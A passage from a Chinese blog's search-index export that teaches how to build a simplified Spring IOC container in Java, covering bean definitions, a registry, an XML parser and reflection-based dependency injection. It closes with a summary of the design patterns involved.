class="line">        <span class="keyword">for</span> (PropertyValue pv : <span class="keyword">this</span>.propertyValueList) &#123;</span><br><span class="line">            <span class="keyword">if</span> (pv.getName().equals(propertyName)) &#123;</span><br><span class="line">                <span class="keyword">return</span> pv;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取迭代器对象</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Iterator&lt;PropertyValue&gt; <span class="title">iterator</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> propertyValueList.iterator();</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">    <span class="comment">// 判断集合是否为空</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.propertyValueList.isEmpty();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加PropertyValue对象</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> MutablePropertyValues <span class="title">addPropertyValue</span><span class="params">(PropertyValue pv)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 判断集合中存储的PropertyValue对象是否和传递进行的重复了，如果重复了，进行覆盖</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.propertyValueList.size(); i++) &#123;</span><br><span class="line">            <span class="comment">// 获取集合中每一个PropertyValue对象</span></span><br><span class="line">            PropertyValue currentPv = <span class="keyword">this</span>.propertyValueList.get(i);</span><br><span class="line">            <span class="keyword">if</span> (currentPv.getName().equals(pv.getName())) &#123;</span><br><span class="line">                <span class="keyword">this</span>.propertyValueList.set(i, <span class="keyword">new</span> PropertyValue(pv.getName(),pv.getRef(), pv.getValue()));</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">this</span>;	<span class="comment">// 目的就是实现链式编程</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.propertyValueList.add(pv);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>;	<span class="comment">// 目的就是实现链式编程</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断是否有指定name属性值的的对象</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">contains</span><span class="params">(String propertyName)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> getPropertyValue(propertyName) != <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="BeanDefinition类"><a href="#BeanDefinition类" class="headerlink" title="BeanDefinition类"></a>BeanDefinition类</h5><p>BeanDefinition类用来<strong>封装bean信息</strong>的，主要包含id（即bean对象的名称）、class（需要交由spring管理的类的全类名）及子标签property数据。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BeanDefinition</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String id;</span><br><span class="line">    <span class="keyword">private</span> String className;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> MutablePropertyValues propertyValues;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">BeanDefinition</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        propertyValues = <span class="keyword">new</span> MutablePropertyValues();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(String id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getClassName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> className;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setClassName</span><span class="params">(String className)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.className = className;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPropertyValues</span><span class="params">(MutablePropertyValues propertyValues)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.propertyValues = propertyValues;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> MutablePropertyValues <span class="title">getPropertyValues</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> propertyValues;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="定义注册表相关类"><a href="#定义注册表相关类" class="headerlink" title="定义注册表相关类"></a>定义注册表相关类</h4><h5 id="BeanDefinitionRegistry接口"><a href="#BeanDefinitionRegistry接口" class="headerlink" title="BeanDefinitionRegistry接口"></a>BeanDefinitionRegistry接口</h5><p>BeanDefinitionRegistry接口<strong>定义了注册表的相关操作</strong>，定义如下功能：</p>
<ul>
<li>注册BeanDefinition对象到注册表中</li>
<li>从注册表中删除指定名称的BeanDefinition对象</li>
<li>根据名称从注册表中获取BeanDefinition对象</li>
<li>判断注册表中是否包含指定名称的BeanDefinition对象</li>
<li>获取注册表中BeanDefinition对象的个数</li>
<li>获取注册表中所有的BeanDefinition的名称</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">BeanDefinitionRegistry</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//注册BeanDefinition对象到注册表中</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">registerBeanDefinition</span><span class="params">(String beanName, BeanDefinition beanDefinition)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//从注册表中删除指定名称的BeanDefinition对象</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">removeBeanDefinition</span><span class="params">(String beanName)</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//根据名称从注册表中获取BeanDefinition对象</span></span><br><span class="line">    <span class="function">BeanDefinition <span class="title">getBeanDefinition</span><span class="params">(String beanName)</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">containsBeanDefinition</span><span class="params">(String beanName)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getBeanDefinitionCount</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    String[] getBeanDefinitionNames();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="SimpleBeanDefinitionRegistry类"><a href="#SimpleBeanDefinitionRegistry类" class="headerlink" title="SimpleBeanDefinitionRegistry类"></a>SimpleBeanDefinitionRegistry类</h5><p>该类实现了BeanDefinitionRegistry接口，定义了Map集合作为注册表容器。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SimpleBeanDefinitionRegistry</span> <span class="keyword">implements</span> <span class="title">BeanDefinitionRegistry</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Map&lt;String, BeanDefinition&gt; beanDefinitionMap = <span class="keyword">new</span> HashMap&lt;String, BeanDefinition&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">registerBeanDefinition</span><span class="params">(String beanName, BeanDefinition beanDefinition)</span> </span>&#123;</span><br><span class="line">        beanDefinitionMap.put(beanName,beanDefinition);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">removeBeanDefinition</span><span class="params">(String beanName)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        beanDefinitionMap.remove(beanName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> BeanDefinition <span class="title">getBeanDefinition</span><span class="params">(String beanName)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> beanDefinitionMap.get(beanName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">containsBeanDefinition</span><span class="params">(String beanName)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> beanDefinitionMap.containsKey(beanName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getBeanDefinitionCount</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> beanDefinitionMap.size();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String[] getBeanDefinitionNames() &#123;</span><br><span class="line">        <span class="keyword">return</span> beanDefinitionMap.keySet().toArray(<span class="keyword">new</span> String[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="定义解析器相关类"><a href="#定义解析器相关类" class="headerlink" title="定义解析器相关类"></a>定义解析器相关类</h4><h5 id="BeanDefinitionReader接口"><a href="#BeanDefinitionReader接口" class="headerlink" title="BeanDefinitionReader接口"></a>BeanDefinitionReader接口</h5><p>BeanDefinitionReader是用来<strong>解析配置文件并在注册表中注册bean的信息</strong>。定义了两个规范：</p>
<ul>
<li>获取注册表的功能，让外界可以通过该对象获取注册表对象。</li>
<li>加载配置文件，并注册bean数据。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">BeanDefinitionReader</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//获取注册表对象</span></span><br><span class="line">    <span class="function">BeanDefinitionRegistry <span class="title">getRegistry</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="comment">//加载配置文件并在注册表中进行注册</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">loadBeanDefinitions</span><span class="params">(String configLocation)</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="XmlBeanDefinitionReader类"><a href="#XmlBeanDefinitionReader类" class="headerlink" title="XmlBeanDefinitionReader类"></a>XmlBeanDefinitionReader类</h5><p>XmlBeanDefinitionReader类是专门用来<strong>解析xml配置文件</strong>的。该类实现BeanDefinitionReader接口并实现接口中的两个功能。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">XmlBeanDefinitionReader</span> <span class="keyword">implements</span> <span class="title">BeanDefinitionReader</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> BeanDefinitionRegistry registry;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">XmlBeanDefinitionReader</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.registry = <span class="keyword">new</span> SimpleBeanDefinitionRegistry();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> BeanDefinitionRegistry <span class="title">getRegistry</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> registry;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">loadBeanDefinitions</span><span class="params">(String configLocation)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        InputStream is = <span class="keyword">this</span>.getClass().getClassLoader().getResourceAsStream(configLocation);</span><br><span class="line">        SAXReader reader = <span class="keyword">new</span> SAXReader();</span><br><span class="line">        Document document = reader.read(is);</span><br><span class="line">        Element rootElement = document.getRootElement();</span><br><span class="line">        <span class="comment">//解析bean标签</span></span><br><span class="line">        parseBean(rootElement);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">parseBean</span><span class="params">(Element rootElement)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        List&lt;Element&gt; elements = rootElement.elements();</span><br><span class="line">        <span class="keyword">for</span> (Element element : elements) &#123;</span><br><span class="line">            String id = element.attributeValue(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">            String className = element.attributeValue(<span class="string">&quot;class&quot;</span>);</span><br><span class="line">            BeanDefinition beanDefinition = <span class="keyword">new</span> BeanDefinition();</span><br><span class="line">            beanDefinition.setId(id);</span><br><span class="line">            beanDefinition.setClassName(className);</span><br><span class="line">            List&lt;Element&gt; list = element.elements(<span class="string">&quot;property&quot;</span>);</span><br><span class="line">            MutablePropertyValues mutablePropertyValues = <span class="keyword">new</span> MutablePropertyValues();</span><br><span class="line">            <span class="keyword">for</span> (Element element1 : list) &#123;</span><br><span class="line">                String name = element1.attributeValue(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">                String ref = element1.attributeValue(<span class="string">&quot;ref&quot;</span>);</span><br><span class="line">                String value = element1.attributeValue(<span class="string">&quot;value&quot;</span>);</span><br><span class="line">                PropertyValue propertyValue = <span class="keyword">new</span> PropertyValue(name,ref,value);</span><br><span class="line">                mutablePropertyValues.addPropertyValue(propertyValue);</span><br><span class="line">            &#125;</span><br><span class="line">            beanDefinition.setPropertyValues(mutablePropertyValues);</span><br><span class="line"></span><br><span class="line">            registry.registerBeanDefinition(id,beanDefinition);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="IOC容器相关类"><a href="#IOC容器相关类" class="headerlink" title="IOC容器相关类"></a>IOC容器相关类</h4><h5 id="BeanFactory接口"><a href="#BeanFactory接口" class="headerlink" title="BeanFactory接口"></a>BeanFactory接口</h5><p>在该接口中<strong>定义IOC容器的统一规范即获取bean对象</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">BeanFactory</span> </span>&#123;</span><br><span class="line">	<span class="comment">//根据bean对象的名称获取bean对象</span></span><br><span class="line">    <span class="function">Object <span class="title">getBean</span><span class="params">(String name)</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line">	<span class="comment">//根据bean对象的名称获取bean对象，并进行类型转换</span></span><br><span class="line">    &lt;T&gt; <span class="function">T <span class="title">getBean</span><span class="params">(String name, Class&lt;? extends T&gt; clazz)</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="ApplicationContext接口"><a href="#ApplicationContext接口" class="headerlink" title="ApplicationContext接口"></a>ApplicationContext接口</h5><p>该接口的所以的<strong>子实现类对bean对象的创建都是非延时</strong>的，所以在该接口中定义 <code>refresh()</code> 方法，该方法主要完成以下两个功能：</p>
<ul>
<li>加载配置文件。</li>
<li>根据注册表中的BeanDefinition对象封装的数据进行bean对象的创建。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">ApplicationContext</span> <span class="keyword">extends</span> <span class="title">BeanFactory</span> </span>&#123;</span><br><span class="line">	<span class="comment">//进行配置文件加载并进行对象创建</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">refresh</span><span class="params">()</span> <span class="keyword">throws</span> IllegalStateException, Exception</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="AbstractApplicationContext类"><a href="#AbstractApplicationContext类" class="headerlink" title="AbstractApplicationContext类"></a>AbstractApplicationContext类</h5><ul>
<li><p>作为<strong>ApplicationContext接口的子类</strong>，所以该类也是非延时加载，所以需要在该类中定义一个Map集合，作为bean对象存储的容器。</p>
</li>
<li><p>声明BeanDefinitionReader类型的变量，用来进行xml配置文件的解析，符合单一职责原则。</p>
<p>BeanDefinitionReader类型的对象创建交由子类实现，因为只有子类明确到底创建BeanDefinitionReader哪儿个子实现类对象。</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractApplicationContext</span> <span class="keyword">implements</span> <span class="title">ApplicationContext</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> BeanDefinitionReader beanDefinitionReader;</span><br><span class="line">    <span class="comment">//用来存储bean对象的容器   key存储的是bean的id值，value存储的是bean对象</span></span><br><span class="line">    <span class="keyword">protected</span> Map&lt;String, Object&gt; singletonObjects = <span class="keyword">new</span> HashMap&lt;String, Object&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//存储配置文件的路径</span></span><br><span class="line">    <span class="keyword">protected</span> String configLocation;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">refresh</span><span class="params">()</span> <span class="keyword">throws</span> IllegalStateException, Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//加载BeanDefinition</span></span><br><span class="line">        beanDefinitionReader.loadBeanDefinitions(configLocation);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//初始化bean</span></span><br><span class="line">        finishBeanInitialization();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//bean的初始化</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">finishBeanInitialization</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        BeanDefinitionRegistry registry = beanDefinitionReader.getRegistry();</span><br><span class="line">        String[] beanNames = registry.getBeanDefinitionNames();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (String beanName : beanNames) &#123;</span><br><span class="line">            BeanDefinition beanDefinition = registry.getBeanDefinition(beanName);</span><br><span class="line">            getBean(beanName);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意：该类finishBeanInitialization()方法中调用getBean()方法使用到了模板方法模式。</p>
</blockquote>
<h5 id="ClassPathXmlApplicationContext类"><a href="#ClassPathXmlApplicationContext类" class="headerlink" title="ClassPathXmlApplicationContext类"></a>ClassPathXmlApplicationContext类</h5><p>该类主要是加载类路径下的配置文件，并进行bean对象的创建，主要完成以下功能：</p>
<ul>
<li>在构造方法中，创建BeanDefinitionReader对象。</li>
<li>在构造方法中，调用refresh()方法，用于进行配置文件加载、创建bean对象并存储到容器中。</li>
<li>重写父接口中的getBean()方法，并实现依赖注入操作。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassPathXmlApplicationContext</span> <span class="keyword">extends</span> <span class="title">AbstractApplicationContext</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ClassPathXmlApplicationContext</span><span class="params">(String configLocation)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.configLocation = configLocation;</span><br><span class="line">        <span class="comment">//构建XmlBeanDefinitionReader对象</span></span><br><span class="line">        beanDefinitionReader = <span class="keyword">new</span> XmlBeanDefinitionReader();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.refresh();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//根据bean的id属性值获取bean对象</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getBean</span><span class="params">(String name)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//return singletonObjects.get(name);</span></span><br><span class="line">        <span class="comment">// 判断对象容器中是否包含指定名称的bean对象，如果包含，直接返回即可，如果不包含，需要自行创建</span></span><br><span class="line">        Object obj = singletonObjects.get(name);</span><br><span class="line">        <span class="keyword">if</span>(obj != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> obj;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取BeanDefinition对象</span></span><br><span class="line">        BeanDefinitionRegistry registry = beanDefinitionReader.getRegistry();</span><br><span class="line">        BeanDefinition beanDefinition = registry.getBeanDefinition(name);</span><br><span class="line">        <span class="keyword">if</span>(beanDefinition == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 获取bean信息中的className</span></span><br><span class="line">        String className = beanDefinition.getClassName();</span><br><span class="line">        <span class="comment">// 通过反射创建对象</span></span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(className);</span><br><span class="line">        Object beanObj = clazz.newInstance();</span><br><span class="line">        <span class="comment">// 进行依赖注入操作</span></span><br><span class="line">        MutablePropertyValues propertyValues = beanDefinition.getPropertyValues();</span><br><span class="line">        <span class="keyword">for</span> (PropertyValue propertyValue : propertyValues) &#123;</span><br><span class="line">            <span class="comment">// 获取name属性</span></span><br><span class="line">            String propertyName = propertyValue.getName();</span><br><span class="line">            <span class="comment">// 获取value属性</span></span><br><span class="line">            String value = propertyValue.getValue();</span><br><span class="line">            <span class="comment">// 获取ref属性</span></span><br><span class="line">            String ref = propertyValue.getRef();</span><br><span class="line">            <span class="keyword">if</span>(ref != <span class="keyword">null</span> &amp;&amp; !<span class="string">&quot;&quot;</span>.equals(ref)) &#123;</span><br><span class="line">				<span class="comment">// 获取依赖的bean对象</span></span><br><span class="line">                Object bean = getBean(ref);</span><br><span class="line">                <span class="comment">// 拼接方法名</span></span><br><span class="line">                String methodName = StringUtils.getSetterMethodNameByFieldName(propertyName);</span><br><span class="line">                <span class="comment">// 获取所有的方法对象</span></span><br><span class="line">                Method[] methods = clazz.getMethods();</span><br><span class="line">                <span class="keyword">for</span> (Method method : methods) &#123;</span><br><span class="line">                    <span class="keyword">if</span>(method.getName().equals(methodName)) &#123;</span><br><span class="line">                        <span class="comment">// 执行setter方法</span></span><br><span class="line">                        method.invoke(beanObj,bean);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(value != <span class="keyword">null</span> &amp;&amp; !<span class="string">&quot;&quot;</span>.equals(value)) &#123;</span><br><span class="line">                <span class="comment">// 拼接方法名</span></span><br><span class="line">                String methodName = StringUtils.getSetterMethodNameByFieldName(propertyName);</span><br><span class="line">                <span class="comment">// 获取method对象</span></span><br><span class="line">                Method method = clazz.getMethod(methodName, String.class);</span><br><span class="line">                method.invoke(beanObj,value);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 在返回beanObj对象之前，将该对象存储到map容器中</span></span><br><span class="line">        singletonObjects.put(name,beanObj);</span><br><span class="line">        <span class="keyword">return</span> beanObj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> &lt;T&gt; <span class="function">T <span class="title">getBean</span><span class="params">(String name, Class&lt;? extends T&gt; clazz)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        Object bean = getBean(name);</span><br><span class="line">        <span class="keyword">if</span>(bean != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> clazz.cast(bean);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="自定义Spring-IOC总结"><a href="#自定义Spring-IOC总结" class="headerlink" title="自定义Spring IOC总结"></a>自定义Spring IOC总结</h3><h4 id="使用到的设计模式"><a href="#使用到的设计模式" class="headerlink" title="使用到的设计模式"></a>使用到的设计模式</h4><ul>
<li>工厂模式。这个使用工厂模式 + 配置文件的方式。</li>
<li>单例模式。Spring IOC管理的bean对象都是单例的，此处的单例不是通过构造器进行单例的控制的，而是spring框架对每一个bean只创建了一个对象。</li>
<li>模板方法模式。AbstractApplicationContext类中的finishBeanInitialization()方法调用了子类的getBean()方法，因为getBean()的实现和环境息息相关。</li>
<li>迭代器模式。对于MutablePropertyValues类定义使用到了迭代器模式，因为此类存储并管理PropertyValue对象，也属于一个容器，所以给该容器提供一个遍历方式。</li>
</ul>
<p>==spring框架其实使用到了很多设计模式，如AOP使用到了代理模式，选择JDK代理或者CGLIB代理使用到了策略模式，还有适配器模式，装饰者模式，观察者模式等==。</p>
<h4 id="符合大部分设计原则"><a href="#符合大部分设计原则" class="headerlink" title="符合大部分设计原则"></a>符合大部分设计原则</h4><h4 id="整个设计和Spring的设计还是有一定的出入"><a href="#整个设计和Spring的设计还是有一定的出入" class="headerlink" title="整个设计和Spring的设计还是有一定的出入"></a>整个设计和Spring的设计还是有一定的出入</h4><p>spring框架底层是很复杂的，进行了很深入的封装，并对外提供了很好的扩展性。而我们自定义SpringIOC有以下几个目的：</p>
<ul>
<li>了解Spring底层对对象的大体管理机制。</li>
<li>了解设计模式在具体的开发中的使用。</li>
<li>以后学习spring源码，通过该案例的实现，可以降低spring学习的入门成本。</li>
</ul>
]]></content>
      <tags>
        <tag>设计模式</tag>
        <tag>UML</tag>
        <tag>设计原则</tag>
        <tag>Spring源码</tag>
      </tags>
  </entry>
</search>
